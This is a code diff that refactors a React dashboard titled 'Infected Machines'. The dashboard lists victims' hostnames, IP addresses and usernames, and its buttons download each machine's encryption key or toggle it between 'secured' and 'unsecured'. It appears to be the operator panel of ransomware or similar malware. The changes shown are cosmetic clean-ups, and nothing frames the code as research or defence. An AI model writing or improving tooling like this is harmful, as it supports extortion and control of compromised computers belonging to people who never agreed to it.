@@ -1,5 +1,3 @@
-//KeyList.jsx
-
 import { useState, useEffect } from 'react';
 import { fetchAllKeys, updateKeyState, downloadKey } from '../services/KeyService';
 import 'bootstrap/dist/css/bootstrap.min.css';
@@ -14,13 +12,11 @@ const KeyList = () => {
   useEffect(() => {
     const getKeys = async () => {
       try {
-        console.log("Fetching keys...");
         const data = await fetchAllKeys();
-        console.log("Keys received:", data);
         setKeys(data);
         setLoading(false);
       } catch (err) {
-        console.error("Error details:", err);
+        console.error("Error fetching keys:", err);
         setError('Failed to fetch encryption keys');
         setLoading(false);
       }
@@ -32,9 +28,7 @@ const KeyList = () => {
   const handleToggleState = async (keyId, currentState) => {
     try {
       const newState = currentState === 'secured' ? 'unsecured' : 'secured';
-      const updatedKey = await updateKeyState(keyId, newState);
-      
-      // Update the state in the local keys array
+      await updateKeyState(keyId, newState);
       setKeys(keys.map(key => 
         key._id === keyId ? { ...key, state: newState } : key
       ));
@@ -48,13 +42,8 @@ const KeyList = () => {
     downloadKey(encryptionKey, hostname);
   };
 
-  const openMachineDetails = (machine) => {
-    setSelectedMachine(machine);
-  };
-
-  const closeMachineDetails = () => {
-    setSelectedMachine(null);
-  };
+  const openMachineDetails = (machine) => setSelectedMachine(machine);
+  const closeMachineDetails = () => setSelectedMachine(null);
 
   if (loading) return <div className="text-center mt-5">Loading machines...</div>;
   if (error) return <div className="alert alert-danger mt-3">{error}</div>;
@@ -64,13 +53,13 @@ const KeyList = () => {
       <h2>Infected Machines</h2>
       
       {keys.length === 0 ? (
-        <p>No machines found</p>
+        <p className="text-muted text-center">No machines found</p>
       ) : (
         <div className="table-responsive">
           <table className="table table-striped">
             <thead>
               <tr>
-                <th>Machine</th>
+                <th>#</th>
                 <th>Hostname</th>
                 <th>IP Address</th>
                 <th>Status</th>
@@ -103,7 +92,7 @@ const KeyList = () => {
                       className="btn btn-primary btn-sm"
                       onClick={() => handleDownloadKey(key.encryption_key, key.hostname)}
                     >
-                      <i className="bi bi-download me-1"></i> Download Key
+                      Download Key
                     </button>
                   </td>
                   <td>
@@ -111,7 +100,7 @@ const KeyList = () => {
                       className="btn btn-info btn-sm"
                       onClick={() => openMachineDetails(key)}
                     >
-                      <i className="bi bi-person me-1"></i> {key.username || 'User Details'}
+                      {key.username || 'User Details'}
                     </button>
                   </td>
                 </tr>
@@ -121,7 +110,6 @@ const KeyList = () => {
         </div>
       )}
 
-      {/* Machine Details Modal */}
       {selectedMachine && (
         <>
           <div className="modal-backdrop show" onClick={closeMachineDetails}></div>
@@ -144,7 +132,7 @@ const KeyList = () => {
                       <strong>Username:</strong> {selectedMachine.username || 'Not available'}
                     </li>
                     <li className="list-group-item">
-                      <strong>Created At:</strong> {selectedMachine.sent_at || 'Not available'}
+                      <strong>Created At:</strong> {selectedMachine.sent_at ? new Date(selectedMachine.sent_at).toLocaleString() : 'Not available'}
                     </li>
                   </ul>
                 </div>
